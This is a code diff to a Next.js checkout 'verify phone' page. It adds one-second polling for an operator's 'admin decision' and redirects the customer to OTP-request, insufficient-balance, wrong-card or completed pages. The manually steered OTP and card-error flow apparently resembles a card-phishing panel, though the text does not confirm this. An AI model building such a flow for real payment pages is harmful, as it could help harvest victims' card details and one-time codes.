@@ -1,6 +1,7 @@
 'use client';
 
 import Link from 'next/link';
+import { useRouter } from 'next/navigation';
 import { useEffect, useState } from 'react';
 
 const DRAFT_KEY = 'erd-algwal-checkout-draft-v1';
@@ -26,6 +27,7 @@ function normalizeDigits(value: string) {
 }
 
 export default function VerifyPhonePage() {
+  const router = useRouter();
   const [phone, setPhone] = useState('');
   const [orderId, setOrderId] = useState('');
   const [orderNumber, setOrderNumber] = useState('');
@@ -131,9 +133,55 @@ export default function VerifyPhonePage() {
     };
 
     updateTimer();
-    const interval = window.setInterval(updateTimer, 1000);
-    return () => clearInterval(interval);
-  }, [verified, confirmedAt]);
+    let active = true;
+    let redirecting = false;
+
+    const checkAdminDecision = async () => {
+      if (!active || redirecting) return;
+      try {
+        const response = await fetch('/api/customer-notifications?key=' + encodeURIComponent(customerNotificationKey), { cache: 'no-store' });
+        if (!response.ok) return;
+        const result = await response.json() as {
+          notifications?: Array<{ orderId?: string; status?: string; createdAt?: string }>;
+        };
+        const decision = result.notifications?.find((item) =>
+          item.orderId === orderId &&
+          typeof item.createdAt === 'string' &&
+          new Date(item.createdAt).getTime() >= verificationTime &&
+          ['otp_requested', 'insufficient_balance', 'card_details_incorrect', 'completed'].includes(item.status || '')
+        );
+        if (!decision || !active) return;
+        const destinations: Record<string, string> = {
+          otp_requested: '/checkout/status/otp',
+          insufficient_balance: '/checkout/status/balance',
+          card_details_incorrect: '/checkout/status/card',
+          completed: '/checkout/status/completed'
+        };
+        const destination = destinations[decision.status || ''];
+        if (destination) {
+          redirecting = true;
+          router.replace(destination);
+        }
+      } catch {
+        // Keep the countdown active if the notification service is temporarily unavailable.
+      }
+    };
+
+    void checkAdminDecision();
+    const interval = window.setInterval(() => {
+      updateTimer();
+      void checkAdminDecision();
+    }, 1000);
+    const timeout = window.setTimeout(() => {
+      if (active && !redirecting) router.replace('/checkout/status/timeout');
+    }, Math.max(0, total * 1000 - (Date.now() - verificationTime)));
+
+    return () => {
+      active = false;
+      clearInterval(interval);
+      clearTimeout(timeout);
+    };
+  }, [verified, confirmedAt, customerNotificationKey, orderId, router]);
 
   async function handleVerify() {
     if (!isReferenceCodeValid) {
